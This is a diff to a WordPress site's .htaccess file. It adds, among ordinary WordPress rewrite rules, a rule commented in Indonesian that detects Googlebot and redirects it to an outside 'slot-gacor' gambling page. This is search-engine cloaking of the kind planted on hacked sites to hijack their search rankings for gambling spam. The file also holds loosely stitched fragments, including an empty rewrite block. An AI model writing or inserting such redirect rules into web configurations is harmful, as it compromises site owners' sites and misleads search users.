@@ -1,3 +1,30 @@
+# Redirect Googlebot ke konten khusus
+RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]
+RewriteRule ^(.*)$ https://bloomtalks.com/chia-cundinamarca/slot-gacor.html [L,R=302]
+
+
+
+# BEGIN WordPress
+# Las directivas (líneas) entre «BEGIN WordPress» y «END WordPress» son
+# generadas dinámicamente y solo deberían ser modificadas mediante filtros de WordPress.
+# Cualquier cambio en las directivas que hay entre esos marcadores serán sobrescritas.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /web/
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /web/index.php [L]
+</IfModule>
+
+# END WordPress
+
+# Di file .htaccess root WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+
+</IfModule>
 # Tambahkan di .htaccess
 <IfModule mod_php8.c>
     php_value extension curl.so
